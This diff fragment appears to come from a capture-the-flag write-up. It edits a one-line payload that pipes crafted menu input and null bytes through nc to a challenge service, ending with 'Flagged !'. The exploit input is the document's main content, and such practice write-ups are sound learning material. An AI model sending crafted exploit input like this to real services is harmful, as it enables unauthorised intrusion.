@@ -31,7 +31,7 @@ This means we need to give a name that has it's first 4 bytes as null (or 3 null
 
 Which gives the following payload :  
 ```py
-python -c 'print("2\n100\n3\n1\n\x00\x00\x00\x00\n4\n")' | nc 172.18.0.1 1339
+python -c 'print("2\n100\n3\n1\n\x00\x00\x00\x00\x01\n4\n")' | nc 172.18.0.1 1339
 ```
 
 Flagged !
